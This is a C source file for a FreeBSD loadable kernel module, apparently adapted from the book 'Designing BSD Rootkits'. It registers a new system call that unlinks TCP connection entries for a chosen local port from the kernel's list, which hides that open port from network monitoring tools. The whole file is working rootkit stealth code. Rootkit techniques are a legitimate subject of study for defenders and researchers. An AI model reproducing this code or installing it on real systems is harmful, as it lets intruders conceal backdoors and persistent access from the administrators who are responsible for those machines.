// From 'Designing BSD RootKit'

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/ck.h>
#include <sys/smr.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/mutex.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>
#include <bsm/audit_kevents.h>

struct port_hiding_args {
    u_int16_t lport;
};

extern struct inpcbinfo tcbinfo;

/* System call to hide an open port. */
static int port_hiding(struct thread *td, void *syscall_args) {
    struct port_hiding_args *uap;
    uap = (struct port_hiding_args *)syscall_args;
    
    struct inpcbinfo *pcbinfo = &V_tcbinfo;
    struct inpcb *inpb;

    INP_INFO_WLOCK(pcbinfo);

    CK_LIST_FOREACH(inpb, &pcbinfo->ipi_listhead, inp_list) {
        /* Do we want to hide this local open port? */
        INP_WLOCK(inpb);
        if (uap->lport == ntohs(inpb->inp_inc.inc_ie.ie_lport)) {
            CK_LIST_REMOVE(inpb, inp_list);
        }
        INP_WUNLOCK(inpb);
    }
    INP_INFO_WUNLOCK(pcbinfo);
   
    return(0);
}

static struct sysent port_hiding_sysent = {
    port_hiding,
    NULL,
    1
};

static int offset = NO_SYSCALL;

// Load/unload event handler.
static int load(struct module *module, int cmd, void *arg) {
    int error = 0;
    switch (cmd) {
        case MOD_LOAD:
            uprintf("System call loaded at offset %d.\n", offset);
            break;
        case MOD_UNLOAD:
            uprintf("System call unloaded from offset %d.\n", offset);
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }
    return(error);
}

SYSCALL_MODULE(port_hiding, &offset, &port_hiding_sysent, load, NULL);
